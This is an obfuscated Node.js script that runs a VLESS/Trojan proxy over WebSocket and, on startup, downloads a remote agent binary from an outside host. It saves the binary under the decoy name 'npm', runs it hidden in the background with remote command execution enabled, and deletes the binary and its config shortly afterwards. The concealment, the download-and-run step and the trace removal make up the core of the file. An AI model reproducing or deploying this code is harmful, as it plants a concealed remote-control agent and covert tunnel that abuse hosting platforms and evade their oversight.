function _0x3354(_0x56b871,_0x22b341){_0x56b871=_0x56b871-0x76;const _0x3cf20a=_0x3cf2();let _0x3354d3=_0x3cf20a[_0x56b871];return _0x3354d3;}const _0x37e2d1=_0x3354;(function(_0x2ef1f4,_0x507c4c){const _0x5af7cd=_0x3354,_0x58b51c=_0x2ef1f4();while(!![]){try{const _0x1ac9f2=parseInt(_0x5af7cd(0xe8))/0x1+parseInt(_0x5af7cd(0xa4))/0x2+-parseInt(_0x5af7cd(0xc5))/0x3*(-parseInt(_0x5af7cd(0x79))/0x4)+parseInt(_0x5af7cd(0xa9))/0x5+parseInt(_0x5af7cd(0x8c))/0x6+-parseInt(_0x5af7cd(0x89))/0x7*(-parseInt(_0x5af7cd(0x88))/0x8)+-parseInt(_0x5af7cd(0xce))/0x9;if(_0x1ac9f2===_0x507c4c)break;else _0x58b51c['push'](_0x58b51c['shift']());}catch(_0xb03739){_0x58b51c['push'](_0x58b51c['shift']());}}}(_0x3cf2,0x1bd26));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x37e2d1(0x83)),net=require(_0x37e2d1(0xe3)),path=require(_0x37e2d1(0xcc)),crypto=require(_0x37e2d1(0xa0)),{Buffer}=require(_0x37e2d1(0x7e)),{exec,execSync}=require(_0x37e2d1(0xca)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x37e2d1(0xbd)][_0x37e2d1(0xe0)]||_0x37e2d1(0xeb),NEZHA_SERVER=process[_0x37e2d1(0xbd)][_0x37e2d1(0x98)]||'',NEZHA_PORT=process[_0x37e2d1(0xbd)][_0x37e2d1(0xb0)]||'',NEZHA_KEY=process[_0x37e2d1(0xbd)][_0x37e2d1(0xed)]||'',DOMAIN=process[_0x37e2d1(0xbd)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x37e2d1(0xbd)][_0x37e2d1(0xe2)]||!![],WSPATH=process[_0x37e2d1(0xbd)][_0x37e2d1(0xdc)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x37e2d1(0xbd)][_0x37e2d1(0xc7)]||_0x37e2d1(0xe7),NAME=process[_0x37e2d1(0xbd)]['NAME']||'Hug',PORT=process[_0x37e2d1(0xbd)][_0x37e2d1(0xe6)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3edbe2=_0x37e2d1;try{const _0x421201=await axios[_0x3edbe2(0x87)](_0x3edbe2(0xbf)),_0x156d1e=_0x421201[_0x3edbe2(0xd9)];ISP=(_0x156d1e[_0x3edbe2(0x95)]+'-'+_0x156d1e[_0x3edbe2(0xe5)])[_0x3edbe2(0x80)](/ /g,'_');}catch(_0x2b74ac){ISP=_0x3edbe2(0x81);}};GetISP();const httpServer=http[_0x37e2d1(0x8e)]((_0x2fb12f,_0x314a21)=>{const _0x489be7=_0x37e2d1;if(_0x2fb12f[_0x489be7(0xa5)]==='/'){const _0x1615d7=path['join'](__dirname,_0x489be7(0xa6));fs[_0x489be7(0x82)](_0x1615d7,'utf8',(_0xe53dd3,_0x49770e)=>{const _0x3eca9d=_0x489be7;if(_0xe53dd3){_0x314a21[_0x3eca9d(0x7b)](0xc8,{'Content-Type':_0x3eca9d(0xd0)}),_0x314a21[_0x3eca9d(0x76)](_0x3eca9d(0x8b));return;}_0x314a21[_0x3eca9d(0x7b)](0xc8,{'Content-Type':_0x3eca9d(0xd0)}),_0x314a21[_0x3eca9d(0x76)](_0x49770e);});return;}else{if(_0x2fb12f['url']==='/'+SUB_PATH){const _0x14e704='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x489be7(0x85)+DOMAIN+_0x489be7(0xd2)+WSPATH+'#'+NAME+'-'+ISP,_0x1f1472=_0x489be7(0xc8)+UUID+'@'+DOMAIN+_0x489be7(0xba)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x489be7(0xd2)+WSPATH+'#'+NAME+'-'+ISP,_0x22ae49=_0x14e704+'\x0a'+_0x1f1472,_0x14a7a7=Buffer[_0x489be7(0x99)](_0x22ae49)[_0x489be7(0x9c)](_0x489be7(0xc3));_0x314a21['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x314a21['end'](_0x14a7a7+'\x0a');}else _0x314a21[_0x489be7(0x7b)](0x194,{'Content-Type':_0x489be7(0xde)}),_0x314a21['end'](_0x489be7(0xcd));}}),wss=new WebSocket[(_0x37e2d1(0xbe))]({'server':httpServer}),uuid=UUID[_0x37e2d1(0x80)](/-/g,''),DNS_SERVERS=[_0x37e2d1(0x8a),'1.1.1.1'];function resolveHost(_0x30b320){return new Promise((_0x1a8933,_0xa679bc)=>{const _0x3fd2c1=_0x3354;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3fd2c1(0xd5)](_0x30b320)){_0x1a8933(_0x30b320);return;}let _0x1090f3=0x0;function _0x44b938(){const _0x26823a=_0x3fd2c1;if(_0x1090f3>=DNS_SERVERS[_0x26823a(0xd4)]){_0xa679bc(new Error('Failed\x20to\x20resolve\x20'+_0x30b320+_0x26823a(0xc9)));return;}const _0x58e433=DNS_SERVERS[_0x1090f3];_0x1090f3++;const _0x432929=_0x26823a(0xad)+encodeURIComponent(_0x30b320)+_0x26823a(0xa2);axios['get'](_0x432929,{'timeout':0x1388,'headers':{'Accept':_0x26823a(0x94)}})['then'](_0x4ffb97=>{const _0x1fde31=_0x26823a,_0x2cfb88=_0x4ffb97['data'];if(_0x2cfb88[_0x1fde31(0xc4)]===0x0&&_0x2cfb88[_0x1fde31(0x84)]&&_0x2cfb88[_0x1fde31(0x84)]['length']>0x0){const _0x58b4c0=_0x2cfb88[_0x1fde31(0x84)][_0x1fde31(0xf1)](_0x5b622a=>_0x5b622a[_0x1fde31(0x8d)]===0x1);if(_0x58b4c0){_0x1a8933(_0x58b4c0[_0x1fde31(0xd9)]);return;}}_0x44b938();})['catch'](_0x55f31f=>{_0x44b938();});}_0x44b938();});}function handleVlessConnection(_0xc53eee,_0x2fc76d){const _0x3a0533=_0x37e2d1,[_0xba49f]=_0x2fc76d,_0x269f3b=_0x2fc76d['slice'](0x1,0x11);if(!_0x269f3b[_0x3a0533(0xac)]((_0x395ec1,_0x456ef0)=>_0x395ec1==parseInt(uuid[_0x3a0533(0xa1)](_0x456ef0*0x2,0x2),0x10)))return![];let _0x12ab12=_0x2fc76d[_0x3a0533(0x7c)](0x11,0x12)[_0x3a0533(0xd1)]()+0x13;const _0x494c01=_0x2fc76d[_0x3a0533(0x7c)](_0x12ab12,_0x12ab12+=0x2)['readUInt16BE'](0x0),_0x35ec2e=_0x2fc76d['slice'](_0x12ab12,_0x12ab12+=0x1)['readUInt8'](),_0x261495=_0x35ec2e==0x1?_0x2fc76d[_0x3a0533(0x7c)](_0x12ab12,_0x12ab12+=0x4)[_0x3a0533(0xe1)]('.'):_0x35ec2e==0x2?new TextDecoder()['decode'](_0x2fc76d[_0x3a0533(0x7c)](_0x12ab12+0x1,_0x12ab12+=0x1+_0x2fc76d[_0x3a0533(0x7c)](_0x12ab12,_0x12ab12+0x1)[_0x3a0533(0xd1)]())):_0x35ec2e==0x3?_0x2fc76d[_0x3a0533(0x7c)](_0x12ab12,_0x12ab12+=0x10)['reduce']((_0x3809de,_0x743cb6,_0x229cfa,_0x382fa9)=>_0x229cfa%0x2?_0x3809de[_0x3a0533(0xd3)](_0x382fa9[_0x3a0533(0x7c)](_0x229cfa-0x1,_0x229cfa+0x1)):_0x3809de,[])['map'](_0x167df0=>_0x167df0['readUInt16BE'](0x0)[_0x3a0533(0x9c)](0x10))[_0x3a0533(0xe1)](':'):'';_0xc53eee['send'](new Uint8Array([_0xba49f,0x0]));const _0x3a530e=createWebSocketStream(_0xc53eee);return resolveHost(_0x261495)[_0x3a0533(0xa3)](_0x48cc60=>{const _0x413a58=_0x3a0533;net[_0x413a58(0x78)]({'host':_0x48cc60,'port':_0x494c01},function(){const _0x1d0148=_0x413a58;this[_0x1d0148(0xe4)](_0x2fc76d[_0x1d0148(0x7c)](_0x12ab12)),_0x3a530e['on'](_0x1d0148(0xc1),()=>{})[_0x1d0148(0xee)](this)['on']('error',()=>{})[_0x1d0148(0xee)](_0x3a530e);})['on'](_0x413a58(0xc1),()=>{});})['catch'](_0x1fef11=>{net['connect']({'host':_0x261495,'port':_0x494c01},function(){const _0x276507=_0x3354;this[_0x276507(0xe4)](_0x2fc76d[_0x276507(0x7c)](_0x12ab12)),_0x3a530e['on'](_0x276507(0xc1),()=>{})[_0x276507(0xee)](this)['on']('error',()=>{})['pipe'](_0x3a530e);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x1a2394,_0x40341b){const _0x33f807=_0x37e2d1;try{if(_0x40341b[_0x33f807(0xd4)]<0x3a)return![];const _0x49babc=_0x40341b[_0x33f807(0x7c)](0x0,0x38)[_0x33f807(0x9c)](),_0x275d1f=[UUID];let _0xe4c99b=null;for(const _0x5136a0 of _0x275d1f){const _0x31a25a=crypto[_0x33f807(0x77)](_0x33f807(0xab))[_0x33f807(0xd8)](_0x5136a0)[_0x33f807(0xea)](_0x33f807(0xf6));if(_0x31a25a===_0x49babc){_0xe4c99b=_0x5136a0;break;}}if(!_0xe4c99b)return![];let _0x397aa7=0x38;_0x40341b[_0x397aa7]===0xd&&_0x40341b[_0x397aa7+0x1]===0xa&&(_0x397aa7+=0x2);const _0x4acffb=_0x40341b[_0x397aa7];if(_0x4acffb!==0x1)return![];_0x397aa7+=0x1;const _0x426d47=_0x40341b[_0x397aa7];_0x397aa7+=0x1;let _0x509446,_0x1f79ea;if(_0x426d47===0x1)_0x509446=_0x40341b[_0x33f807(0x7c)](_0x397aa7,_0x397aa7+0x4)[_0x33f807(0xe1)]('.'),_0x397aa7+=0x4;else{if(_0x426d47===0x3){const _0x421a4d=_0x40341b[_0x397aa7];_0x397aa7+=0x1,_0x509446=_0x40341b[_0x33f807(0x7c)](_0x397aa7,_0x397aa7+_0x421a4d)[_0x33f807(0x9c)](),_0x397aa7+=_0x421a4d;}else{if(_0x426d47===0x4)_0x509446=_0x40341b[_0x33f807(0x7c)](_0x397aa7,_0x397aa7+0x10)[_0x33f807(0xf0)]((_0x99c7f8,_0x5c8b4e,_0x50aedb,_0x35738d)=>_0x50aedb%0x2?_0x99c7f8[_0x33f807(0xd3)](_0x35738d[_0x33f807(0x7c)](_0x50aedb-0x1,_0x50aedb+0x1)):_0x99c7f8,[])[_0x33f807(0x7a)](_0x11c270=>_0x11c270[_0x33f807(0x86)](0x0)[_0x33f807(0x9c)](0x10))[_0x33f807(0xe1)](':'),_0x397aa7+=0x10;else return![];}}_0x1f79ea=_0x40341b[_0x33f807(0x86)](_0x397aa7),_0x397aa7+=0x2;_0x397aa7<_0x40341b[_0x33f807(0xd4)]&&_0x40341b[_0x397aa7]===0xd&&_0x40341b[_0x397aa7+0x1]===0xa&&(_0x397aa7+=0x2);const _0x3d54f5=createWebSocketStream(_0x1a2394);return resolveHost(_0x509446)[_0x33f807(0xa3)](_0x350619=>{const _0x4384f4=_0x33f807;net[_0x4384f4(0x78)]({'host':_0x350619,'port':_0x1f79ea},function(){const _0x1e4fbd=_0x4384f4;_0x397aa7<_0x40341b['length']&&this[_0x1e4fbd(0xe4)](_0x40341b[_0x1e4fbd(0x7c)](_0x397aa7)),_0x3d54f5['on'](_0x1e4fbd(0xc1),()=>{})[_0x1e4fbd(0xee)](this)['on'](_0x1e4fbd(0xc1),()=>{})[_0x1e4fbd(0xee)](_0x3d54f5);})['on'](_0x4384f4(0xc1),()=>{});})['catch'](_0x3f472e=>{const _0x150775=_0x33f807;net[_0x150775(0x78)]({'host':_0x509446,'port':_0x1f79ea},function(){const _0x535c54=_0x150775;_0x397aa7<_0x40341b[_0x535c54(0xd4)]&&this[_0x535c54(0xe4)](_0x40341b[_0x535c54(0x7c)](_0x397aa7)),_0x3d54f5['on'](_0x535c54(0xc1),()=>{})[_0x535c54(0xee)](this)['on']('error',()=>{})[_0x535c54(0xee)](_0x3d54f5);})['on'](_0x150775(0xc1),()=>{});}),!![];}catch(_0x22be0e){return![];}}wss['on']('connection',(_0x4c8610,_0x59c494)=>{const _0xc6289a=_0x37e2d1,_0x214037=_0x59c494[_0xc6289a(0xa5)]||'';_0x4c8610[_0xc6289a(0xcb)]('message',_0x456562=>{const _0x3485f3=_0xc6289a;if(_0x456562[_0x3485f3(0xd4)]>0x11&&_0x456562[0x0]===0x0){const _0x2a5175=_0x456562[_0x3485f3(0x7c)](0x1,0x11),_0x56d280=_0x2a5175[_0x3485f3(0xac)]((_0x2b7943,_0x14a7dc)=>_0x2b7943==parseInt(uuid[_0x3485f3(0xa1)](_0x14a7dc*0x2,0x2),0x10));if(_0x56d280){!handleVlessConnection(_0x4c8610,_0x456562)&&_0x4c8610[_0x3485f3(0xb1)]();return;}}!handleTrojanConnection(_0x4c8610,_0x456562)&&_0x4c8610['close']();})['on'](_0xc6289a(0xc1),()=>{});});const getDownloadUrl=()=>{const _0x4f498c=_0x37e2d1,_0x2d4ec3=os[_0x4f498c(0xc2)]();return _0x2d4ec3===_0x4f498c(0xf2)||_0x2d4ec3===_0x4f498c(0xb9)||_0x2d4ec3===_0x4f498c(0xdf)?!NEZHA_PORT?_0x4f498c(0x7f):_0x4f498c(0xd7):!NEZHA_PORT?_0x4f498c(0x91):_0x4f498c(0xaa);},downloadFile=async()=>{const _0x3ee3ae=_0x37e2d1;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xe9e34=getDownloadUrl(),_0x381d18=await axios({'method':_0x3ee3ae(0x87),'url':_0xe9e34,'responseType':_0x3ee3ae(0x93)}),_0x5b6fec=fs[_0x3ee3ae(0x97)](_0x3ee3ae(0x7d));return _0x381d18['data'][_0x3ee3ae(0xee)](_0x5b6fec),new Promise((_0x5beb5a,_0x3a8782)=>{const _0x239713=_0x3ee3ae;_0x5b6fec['on']('finish',()=>{const _0x33735e=_0x3354;console[_0x33735e(0x92)]('npm\x20download\x20successfully'),exec(_0x33735e(0xda),_0x202ada=>{if(_0x202ada)_0x3a8782(_0x202ada);_0x5beb5a();});}),_0x5b6fec['on'](_0x239713(0xc1),_0x3a8782);});}catch(_0x16f948){throw _0x16f948;}},runnz=async()=>{const _0x493d19=_0x37e2d1;try{const _0xff90=execSync(_0x493d19(0x9f),{'encoding':_0x493d19(0xd6)});if(_0xff90[_0x493d19(0xb6)]()!==''){console[_0x493d19(0x92)](_0x493d19(0xc6));return;}}catch(_0x5d5f7a){}await downloadFile();let _0x526e42='',_0x288672=[_0x493d19(0xb2),'8443',_0x493d19(0xef),_0x493d19(0xb4),'2083',_0x493d19(0xdb)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x233d70=_0x288672[_0x493d19(0xb3)](NEZHA_PORT)?_0x493d19(0xf3):'';_0x526e42=_0x493d19(0xdd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x493d19(0xcf)+NEZHA_KEY+'\x20'+_0x233d70+_0x493d19(0xa8);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1c2ea6=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x493d19(0xc0)](':')['pop']():'',_0x370545=_0x288672[_0x493d19(0xb3)](_0x1c2ea6)?_0x493d19(0xb5):_0x493d19(0x90),_0x1c90ae=_0x493d19(0xb8)+NEZHA_KEY+_0x493d19(0x9d)+NEZHA_SERVER+_0x493d19(0x96)+_0x370545+_0x493d19(0xbb)+UUID;fs[_0x493d19(0x9a)](_0x493d19(0xae),_0x1c90ae);}_0x526e42=_0x493d19(0x8f);}else{console['log'](_0x493d19(0xaf));return;}}try{exec(_0x526e42,{'shell':'/bin/bash'},_0x422ecd=>{const _0x4751e7=_0x493d19;if(_0x422ecd)console[_0x4751e7(0xc1)]('npm\x20running\x20error:',_0x422ecd);else console[_0x4751e7(0x92)](_0x4751e7(0x9b));});}catch(_0x4e1709){console[_0x493d19(0xc1)](_0x493d19(0xf5)+_0x4e1709);}};async function addAccessTask(){const _0x5f0d61=_0x37e2d1;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x21db6d='https://'+DOMAIN;try{const _0x3f0d83=await axios[_0x5f0d61(0xa7)](_0x5f0d61(0xb7),{'url':_0x21db6d},{'headers':{'Content-Type':_0x5f0d61(0xf4)}});console[_0x5f0d61(0x92)](_0x5f0d61(0xec));}catch(_0x372fc9){}}const delFiles=()=>{const _0x15d6a0=_0x37e2d1;fs[_0x15d6a0(0x9e)](_0x15d6a0(0x7d),()=>{}),fs[_0x15d6a0(0x9e)]('config.yaml',()=>{});};function _0x3cf2(){const _0x34da05=['then','17448iCljvQ','url','index.html','post','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','507615QGxpgL','https://amd64.ssss.nyc.mn/agent','sha224','every','https://dns.google/resolve?name=','config.yaml','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','NEZHA_PORT','close','443','includes','2087','true','trim','https://oooo.serv00.net/add-url','client_secret:\x20','arm64',':443?security=tls&sni=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Server\x20is\x20running\x20on\x20port\x20','env','Server','https://speed.cloudflare.com/meta','split','error','arch','base64','Status','9tFrxwY','npm\x20is\x20already\x20running,\x20skip\x20running...','SUB_PATH','trojan://','\x20with\x20all\x20DNS\x20servers','child_process','once','path','Not\x20Found\x0a','3739734WEJMNz','\x20-p\x20','text/html','readUInt8','&path=%2F','concat','length','test','utf-8','https://arm64.ssss.nyc.mn/agent','update','data','chmod\x20+x\x20npm','2053','WSPATH','setsid\x20nohup\x20./npm\x20-s\x20','text/plain','aarch64','UUID','join','AUTO_ACCESS','net','write','asOrganization','PORT','sub','44006fxsXqs','listen','digest','a63e3f89-3e5b-4124-be4c-9c2c658811bf','Automatic\x20Access\x20Task\x20added\x20successfully','NEZHA_KEY','pipe','2096','reduce','find','arm','--tls','application/json','error:\x20','hex','end','createHash','connect','208148BmqYSg','map','writeHead','slice','npm','buffer','https://arm64.ssss.nyc.mn/v1','replace','Unknown','readFile','axios','Answer','&fp=chrome&type=ws&host=','readUInt16BE','get','123056TdwLJX','7CLAejI','8.8.4.4','Hello\x20world!','1222428TmWiUc','type','createServer','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','false','https://amd64.ssss.nyc.mn/v1','log','stream','application/dns-json','country','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','createWriteStream','NEZHA_SERVER','from','writeFileSync','npm\x20is\x20running','toString','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','unlink','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','crypto','substr','&type=A'];_0x3cf2=function(){return _0x34da05;};return _0x3cf2();}httpServer[_0x37e2d1(0xe9)](PORT,()=>{const _0xffe9d=_0x37e2d1;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xffe9d(0x92)](_0xffe9d(0xbc)+PORT);});
